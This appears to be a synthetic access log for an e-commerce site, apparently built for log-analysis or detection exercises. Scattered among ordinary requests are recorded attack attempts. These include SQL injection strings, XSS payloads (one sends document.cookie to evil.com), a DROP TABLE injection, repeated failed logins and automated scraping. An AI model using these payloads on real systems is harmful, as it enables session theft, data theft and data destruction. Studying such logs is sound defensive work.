192.168.1.35 - - [15/Jun/2025:00:57:10 +0000] "GET /api/orders HTTP/1.1" 200 7638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [15/Jun/2025:00:35:35 +0000] "GET /robots.txt HTTP/1.1" 404 6921 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.45 - - [15/Jun/2025:00:36:10 +0000] "GET /robots.txt HTTP/1.1" 404 4581 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.10 - - [15/Jun/2025:00:52:20 +0000] "GET /contact HTTP/1.1" 404 3986 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.24 - - [15/Jun/2025:00:44:37 +0000] "GET /static/js/app.js HTTP/1.1" 200 7707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.33 - - [15/Jun/2025:00:48:56 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 2612 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.47 - - [15/Jun/2025:00:41:06 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:21:16 +0000] "GET /api/user?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 400 368 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.48 - - [15/Jun/2025:00:32:49 +0000] "GET /api/products?category=clothing HTTP/1.1" 304 5749 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:26:13 +0000] "GET /static/js/app.js HTTP/1.1" 429 2601 "-" "libwww-perl/6.72"
192.168.1.34 - - [15/Jun/2025:00:54:12 +0000] "GET /static/js/app.js HTTP/1.1" 200 4606 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.48 - - [15/Jun/2025:00:46:18 +0000] "GET /cart HTTP/1.1" 200 286 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:00:00 +0000] "POST /api/login HTTP/1.1" 401 186 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.15 - - [15/Jun/2025:00:43:07 +0000] "GET /contact HTTP/1.1" 200 2077 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.43 - - [15/Jun/2025:00:39:46 +0000] "POST /api/products?category=clothing HTTP/1.1" 200 1090 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:19:32 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 382 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:26:21 +0000] "GET /robots.txt HTTP/1.1" 200 2761 "-" "curl/8.5.0"
192.168.1.44 - - [15/Jun/2025:00:34:19 +0000] "POST /checkout HTTP/1.1" 201 1516 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.23 - - [15/Jun/2025:00:35:51 +0000] "GET /api/cart/add HTTP/1.1" 304 6445 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.14 - - [15/Jun/2025:00:56:07 +0000] "GET /cart HTTP/1.1" 200 4338 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:02:55 +0000] "POST /api/login HTTP/1.1" 401 190 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.25 - - [15/Jun/2025:00:39:14 +0000] "GET /api/orders HTTP/1.1" 200 1567 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:04:57 +0000] "POST /api/login HTTP/1.1" 401 205 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:26:03 +0000] "GET /static/js/app.js HTTP/1.1" 200 2087 "-" "curl/8.5.0"
192.168.1.12 - - [15/Jun/2025:00:47:54 +0000] "GET /contact HTTP/1.1" 200 7110 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.42 - - [15/Jun/2025:00:09:38 +0000] "POST /api/login HTTP/1.1" 401 214 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.36 - - [15/Jun/2025:00:33:06 +0000] "GET /search?q=laptop HTTP/1.1" 200 6022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.45 - - [15/Jun/2025:00:31:52 +0000] "POST /contact HTTP/1.1" 201 4747 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:23:06 +0000] "GET /products?name=<img src=x onerror=alert(document.domain)> HTTP/1.1" 400 443 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.33 - - [15/Jun/2025:00:31:02 +0000] "GET /search?q=laptop HTTP/1.1" 404 6675 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:13:03 +0000] "POST /api/login HTTP/1.1" 401 235 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.43 - - [15/Jun/2025:00:42:03 +0000] "POST /images/banner.jpg HTTP/1.1" 201 7586 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.23 - - [15/Jun/2025:00:42:53 +0000] "POST /api/user/profile HTTP/1.1" 200 7854 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.29 - - [15/Jun/2025:00:55:18 +0000] "GET / HTTP/1.1" 304 6890 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:08:29 +0000] "POST /api/login HTTP/1.1" 401 218 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.25 - - [15/Jun/2025:00:55:07 +0000] "GET /api/products?category=clothing HTTP/1.1" 304 2101 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:06:01 +0000] "POST /api/login HTTP/1.1" 401 236 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:08:24 +0000] "POST /api/login HTTP/1.1" 401 228 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.27 - - [15/Jun/2025:00:33:24 +0000] "GET /api/products?category=electronics HTTP/1.1" 404 7972 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.41 - - [15/Jun/2025:00:49:57 +0000] "GET /products HTTP/1.1" 404 4789 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:23:19 +0000] "GET /api/orders?id=1 OR 1=1-- HTTP/1.1" 400 336 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.17 - - [15/Jun/2025:00:43:35 +0000] "GET /api/orders HTTP/1.1" 304 2490 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:25:58 +0000] "GET /static/js/app.js HTTP/1.1" 200 948 "-" "Go-http-client/1.1"
203.0.113.77 - - [15/Jun/2025:00:13:52 +0000] "POST /api/login HTTP/1.1" 401 190 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.14 - - [15/Jun/2025:00:34:37 +0000] "GET /search?q=laptop HTTP/1.1" 304 5300 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.32 - - [15/Jun/2025:00:51:11 +0000] "GET /api/user/profile HTTP/1.1" 200 832 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.26 - - [15/Jun/2025:00:51:47 +0000] "GET /favicon.ico HTTP/1.1" 304 630 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.18 - - [15/Jun/2025:00:54:35 +0000] "POST /static/css/main.css HTTP/1.1" 200 7444 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.29 - - [15/Jun/2025:00:57:49 +0000] "POST /checkout HTTP/1.1" 200 3064 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:14:12 +0000] "POST /api/login HTTP/1.1" 401 223 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.25 - - [15/Jun/2025:00:56:12 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 826 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.24 - - [15/Jun/2025:00:55:27 +0000] "POST /images/banner.jpg HTTP/1.1" 201 1084 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [15/Jun/2025:00:27:29 +0000] "POST /api/orders HTTP/1.1" 200 1949 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.44 - - [15/Jun/2025:00:58:10 +0000] "GET /api/user/profile HTTP/1.1" 404 3763 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.41 - - [15/Jun/2025:00:33:43 +0000] "POST /index.html HTTP/1.1" 200 247 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.37 - - [15/Jun/2025:00:39:36 +0000] "GET /checkout HTTP/1.1" 200 5205 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:26:25 +0000] "GET /images/banner.jpg HTTP/1.1" 200 2058 "-" "Wget/1.21.4"
203.0.113.77 - - [15/Jun/2025:00:19:50 +0000] "GET /search?q=1' UNION SELECT null,table_name FROM information_schema.tables-- HTTP/1.1" 400 353 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [15/Jun/2025:00:28:13 +0000] "GET /api/cart/add HTTP/1.1" 200 6654 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.18 - - [15/Jun/2025:00:46:04 +0000] "POST / HTTP/1.1" 200 3711 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [15/Jun/2025:00:44:05 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 6144 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.37 - - [15/Jun/2025:00:48:09 +0000] "POST /api/cart/add HTTP/1.1" 201 4397 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.49 - - [15/Jun/2025:00:30:25 +0000] "GET /cart HTTP/1.1" 200 4129 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.36 - - [15/Jun/2025:00:32:16 +0000] "POST /static/css/main.css HTTP/1.1" 200 2545 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:26:19 +0000] "GET / HTTP/1.1" 200 2225 "-" "curl/8.5.0"
192.168.1.21 - - [15/Jun/2025:00:32:21 +0000] "GET /search?q=laptop HTTP/1.1" 404 7896 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:18:49 +0000] "GET /api/comment?text=<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script> HTTP/1.1" 400 583 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.32 - - [15/Jun/2025:00:35:37 +0000] "GET /images/banner.jpg HTTP/1.1" 304 515 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:26:01 +0000] "GET / HTTP/1.1" 200 3977 "-" "Wget/1.21.4"
192.168.1.24 - - [15/Jun/2025:00:57:23 +0000] "GET /api/cart/add HTTP/1.1" 304 1244 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:26:09 +0000] "GET /cart HTTP/1.1" 200 1142 "-" "Go-http-client/1.1"
45.152.66.201 - - [15/Jun/2025:00:26:05 +0000] "GET /products HTTP/1.1" 200 1579 "-" "libwww-perl/6.72"
192.168.1.46 - - [15/Jun/2025:00:36:59 +0000] "GET /api/cart/add HTTP/1.1" 200 5667 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.42 - - [15/Jun/2025:00:10:33 +0000] "POST /api/login HTTP/1.1" 401 200 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:17:39 +0000] "GET /api/user?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 400 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.38 - - [15/Jun/2025:00:34:28 +0000] "GET /search?q=laptop HTTP/1.1" 404 7390 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.40 - - [15/Jun/2025:00:28:06 +0000] "GET /products HTTP/1.1" 404 2361 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.47 - - [15/Jun/2025:00:50:12 +0000] "GET /about HTTP/1.1" 200 5280 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:14:51 +0000] "POST /api/login HTTP/1.1" 401 215 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.34 - - [15/Jun/2025:00:32:51 +0000] "POST /favicon.ico HTTP/1.1" 200 2890 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:25:01 +0000] "GET /api/login?user=admin'-- HTTP/1.1" 400 306 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.44 - - [15/Jun/2025:00:38:06 +0000] "GET /static/css/main.css HTTP/1.1" 404 7672 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.40 - - [15/Jun/2025:00:28:35 +0000] "POST /static/css/main.css HTTP/1.1" 200 1082 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.12 - - [15/Jun/2025:00:31:33 +0000] "POST /api/orders HTTP/1.1" 201 6705 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.32 - - [15/Jun/2025:00:27:12 +0000] "GET /favicon.ico HTTP/1.1" 404 6233 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.10 - - [15/Jun/2025:00:56:00 +0000] "GET /favicon.ico HTTP/1.1" 200 730 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.12 - - [15/Jun/2025:00:27:59 +0000] "GET /products HTTP/1.1" 200 3659 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.18 - - [15/Jun/2025:00:27:48 +0000] "GET /products HTTP/1.1" 200 498 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.31 - - [15/Jun/2025:00:41:47 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 4005 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:20:40 +0000] "GET /api/comment?text=<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script> HTTP/1.1" 400 364 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.20 - - [15/Jun/2025:00:42:34 +0000] "POST /about HTTP/1.1" 201 970 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:01:53 +0000] "POST /api/login HTTP/1.1" 401 217 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:26:11 +0000] "GET /api/products HTTP/1.1" 200 2203 "-" "curl/8.5.0"
192.168.1.28 - - [15/Jun/2025:00:31:11 +0000] "POST /api/products?category=clothing HTTP/1.1" 200 570 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.21 - - [15/Jun/2025:00:48:34 +0000] "GET /cart HTTP/1.1" 304 7910 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.38 - - [15/Jun/2025:00:46:12 +0000] "POST /robots.txt HTTP/1.1" 200 5778 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:12:29 +0000] "POST /api/login HTTP/1.1" 401 204 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:26:03 +0000] "GET /api/cart/add HTTP/1.1" 200 2701 "-" "curl/8.5.0"
198.51.100.42 - - [15/Jun/2025:00:23:52 +0000] "GET /search?q=1' UNION SELECT null,table_name FROM information_schema.tables-- HTTP/1.1" 400 376 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.46 - - [15/Jun/2025:00:35:50 +0000] "POST /api/orders HTTP/1.1" 201 7025 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:23:40 +0000] "GET /search?q=<script>document.cookie='stolen='+document.cookie</script> HTTP/1.1" 400 317 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.32 - - [15/Jun/2025:00:36:23 +0000] "POST /products HTTP/1.1" 200 5666 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.16 - - [15/Jun/2025:00:50:45 +0000] "GET /checkout HTTP/1.1" 404 999 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.22 - - [15/Jun/2025:00:37:05 +0000] "POST /contact HTTP/1.1" 201 2955 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.25 - - [15/Jun/2025:00:51:18 +0000] "GET /static/css/main.css HTTP/1.1" 200 3390 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:05:14 +0000] "POST /api/login HTTP/1.1" 401 208 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.23 - - [15/Jun/2025:00:49:33 +0000] "GET /cart HTTP/1.1" 200 6071 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.40 - - [15/Jun/2025:00:54:21 +0000] "GET /api/orders HTTP/1.1" 200 7442 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.34 - - [15/Jun/2025:00:54:04 +0000] "GET /static/js/app.js HTTP/1.1" 200 7715 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.36 - - [15/Jun/2025:00:49:36 +0000] "GET /favicon.ico HTTP/1.1" 200 3211 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.22 - - [15/Jun/2025:00:49:47 +0000] "GET /api/orders HTTP/1.1" 304 6085 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.22 - - [15/Jun/2025:00:57:46 +0000] "POST / HTTP/1.1" 201 1138 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:18:30 +0000] "GET /api/search?term=1; DROP TABLE users-- HTTP/1.1" 400 458 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.33 - - [15/Jun/2025:00:47:18 +0000] "GET /cart HTTP/1.1" 200 2761 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
